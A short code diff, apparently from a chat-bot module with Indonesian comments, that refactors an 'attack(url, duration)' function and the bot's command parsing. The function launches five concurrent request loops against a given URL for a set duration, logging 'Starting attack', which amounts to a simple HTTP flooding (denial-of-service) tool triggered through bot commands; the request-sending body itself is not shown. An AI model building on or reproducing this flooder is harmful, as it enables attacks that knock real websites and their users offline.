@@ -15,12 +15,13 @@ function logCommand(message, type = 'info') {
 
 async function attack(url, duration) {
   const endTime = Date.now() + (duration * 1000);
-  const delays = Array(5).fill(100); // 5 threads dengan delay 100ms
+  const threads = 5; // 5 threads
+  const delayMs = 100; // delay 100ms
   let requestCount = 0;
 
   logCommand(`Starting attack on ${url} for ${duration} seconds`, 'info');
 
-  const attacks = delays.map(async (delayMs, index) => {
+  const attacks = Array(threads).fill().map(async (_, index) => {
     logCommand(`Thread ${index + 1} started`, 'info');
     
     while (Date.now() < endTime) {
@@ -54,7 +55,7 @@ async function attack(url, duration) {
 }
 
 module.exports = async (sock, sender, text, name) => {
-  const args = text.split(' ');
+  const args = text.trim().split(' ');
   const command = args[0].toLowerCase();
 
   if (command === '.menu') {
